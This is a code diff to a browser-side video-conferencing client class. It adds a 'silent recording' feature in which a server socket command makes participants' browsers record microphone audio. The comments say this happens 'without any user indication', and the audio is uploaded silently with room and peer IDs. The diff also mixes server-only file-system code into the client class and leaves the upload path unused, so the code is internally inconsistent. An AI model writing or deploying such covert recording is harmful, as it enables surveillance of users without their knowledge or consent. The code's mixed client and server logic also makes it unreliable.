@@ -1087,11 +1087,222 @@ class RoomClient {
         this.socket.on('editorChange', this.handleEditorChange);
         this.socket.on('editorActions', this.handleEditorActions);
         this.socket.on('editorUpdate', this.handleEditorUpdate);
+
+        // Auto record function
+this.socket.on('silentRecordingCommand', this.handleAutoRecordingStatus.bind(this));
+    this.socket.on('silentRecordingUploaded', this.handleSilentRecordingUploaded.bind(this));
+
     }
 
     // ####################################################
     // HANDLE SOCKET DATA
     // ####################################################
+
+handleSilentRecordingUploaded(data) {
+    console.log("Silent Recording Upload Response:", data);
+
+    if (data.success) {
+        console.log(`✅ Silent recording saved: ${data.filename} (${data.size} bytes)`);
+    } else {
+        console.error(`❌ Silent recording upload failed: ${data.error}`);
+    }
+}
+
+    handleAutoRecordingStatus(data) {
+        console.log("Silent Recording Command:", data) // Only console log, no user notification
+
+        const { action, roomId, timestamp, duration, purpose } = data
+
+        if (action === "start" && purpose === "summary_generation") {
+            // Start silent recording without any user indication
+            this.startSilentRecording()
+        } else if (action === "stop" && purpose === "summary_generation") {
+            // Stop silent recording without any user indication
+            this.stopSilentRecording()
+        }
+    }
+
+
+
+   startSilentRecording() {
+    console.log("🎬 [DEBUG] startSilentRecording() called");
+
+    if (this.silentMediaRecorder && this.silentMediaRecorder.state === "recording") {
+        console.log("⚠️ Silent recording already running");
+        return;
+    }
+
+    try {
+        console.log("🎤 Requesting microphone permission...");
+        navigator.mediaDevices.getUserMedia({
+            audio: {
+                echoCancellation: true,
+                noiseSuppression: true,
+                sampleRate: 44100,
+            }
+        })
+        .then((stream) => {
+            console.log("✅ Microphone access granted");
+
+            this.silentRecordingStream = stream;
+            this.silentRecordedChunks = [];
+
+            const options = {
+                mimeType: "audio/webm;codecs=opus",
+                audioBitsPerSecond: 128000,
+            };
+
+            console.log("🎥 Creating MediaRecorder...");
+            this.silentMediaRecorder = new MediaRecorder(stream, options);
+
+            // जब भी डेटा उपलब्ध हो, chunks में push करें
+            this.silentMediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    this.silentRecordedChunks.push(event.data);
+                    console.log(`📦 Chunk received: ${event.data.size} bytes`);
+                }
+            };
+
+            // जब stop होगा तब processSilentRecording कॉल होगा
+            this.silentMediaRecorder.onstop = () => {
+                console.log("🛑 MediaRecorder stopped");
+                this.processSilentRecording();  // 🚀 upload हटाकर local save करेंगे
+            };
+
+            this.silentMediaRecorder.onerror = (event) => {
+                console.error("❌ MediaRecorder error:", event.error);
+            };
+
+            console.log("▶️ Starting MediaRecorder...");
+            this.silentMediaRecorder.start(1000); // हर 1 सेकंड में chunks collect
+            console.log("✅ Silent recording started");
+        })
+        .catch((error) => {
+            console.error("🚨 Microphone access error:", error);
+        });
+    } catch (error) {
+        console.error("❌ startSilentRecording() failed:", error);
+    }
+}
+
+
+  stopSilentRecording() {
+    console.log("🛑 [DEBUG] stopSilentRecording() called");
+
+    if (this.silentMediaRecorder && this.silentMediaRecorder.state === "recording") {
+        console.log("⏹ Stopping MediaRecorder...");
+        this.silentMediaRecorder.stop();
+
+        // सभी mic tracks बंद करो
+        if (this.silentRecordingStream) {
+            this.silentRecordingStream.getTracks().forEach((track) => {
+                track.stop();
+                console.log("🔇 Mic track stopped");
+            });
+        }
+        console.log("✅ Silent recording stopped successfully");
+    } else {
+        console.log("⚠️ No active silent recording to stop");
+    }
+}
+
+
+    processSilentRecording() {
+    console.log(`📂 Processing silent recording... Chunks: ${this.silentRecordedChunks.length}`);
+
+    if (this.silentRecordedChunks.length === 0) {
+        console.log("⚠️ No silent recording data to process");
+        return;
+    }
+
+    try {
+        const blob = new Blob(this.silentRecordedChunks, { type: "audio/webm" });
+        console.log(`✅ Silent recording blob created: ${blob.size} bytes`);
+
+        // 📥 DOWNLOAD FILE IN BROWSER
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.style.display = "none";
+        a.href = url;
+        a.download = `silent_recording_${Date.now()}.webm`;
+        document.body.appendChild(a);
+        a.click();
+        console.log("📥 Silent recording downloaded automatically");
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+    } catch (error) {
+        console.error("❌ Error processing silent recording:", error);
+    }
+}
+
+
+    uploadSilentRecording(blob) {
+        console.log("Starting silent recording upload...")
+
+        const formData = new FormData()
+        const timestamp = new Date().toISOString().replace(/[:.]/g, "-")
+        const filename = `summary_${this.room_id}_${this.peer_id}_${timestamp}.webm`
+
+        formData.append("silentRecording", blob, filename)
+        formData.append("roomId", this.room_id)
+        formData.append("peerId", this.peer_id)
+        formData.append("purpose", "summary_generation")
+
+        console.log(`Uploading: ${filename} (${blob.size} bytes)`)
+
+        // Upload silently (no user notification)
+        fetch("/upload-silent-recording", {
+            method: "POST",
+            body: formData,
+        })
+            .then((response) => {
+                console.log("Upload response status:", response.status)
+                return response.json()
+            })
+            .then((data) => {
+                console.log("Silent recording upload response:", data)
+                if (data.success) {
+                    console.log(`Silent recording uploaded successfully: ${data.filename}`)
+                } else {
+                    console.error(`Silent recording upload failed: ${data.error}`)
+                }
+            })
+            .catch((error) => {
+                console.error("Silent recording upload error:", error)
+            })
+    }
+
+
+    handleSilentRecordingUpload(peerId, recordingData) {
+        try {
+            const timestamp = new Date().toISOString().replace(/[:.]/g, "-")
+            const filename = `summary_${this.id}_${peerId}_${timestamp}.webm`
+            const recordingsDir = path.join(__dirname, "../recordings/summaries")
+
+            // Ensure directory exists
+            if (!fs.existsSync(recordingsDir)) {
+                fs.mkdirSync(recordingsDir, { recursive: true })
+            }
+
+            const filePath = path.join(recordingsDir, filename)
+
+            // Save the recording file for summary processing
+            fs.writeFileSync(filePath, recordingData)
+
+            console.log(`🔇 Silent recording saved for summary: ${filePath}`)
+            console.log(`📁 File size: ${recordingData.length} bytes`)
+
+            // Process for summary generation (you can add AI processing here)
+            this.processSummaryRecording(filePath, peerId)
+
+            return { success: true, filename, filePath, purpose: "summary", size: recordingData.length }
+        } catch (error) {
+            console.error(`❌ Failed to save silent recording:`, error)
+            return { success: false, error: error.message }
+        }
+    }
+
+
 
     handleSocketConnect = () => {
         console.log('SocketOn Connected to signaling server!');
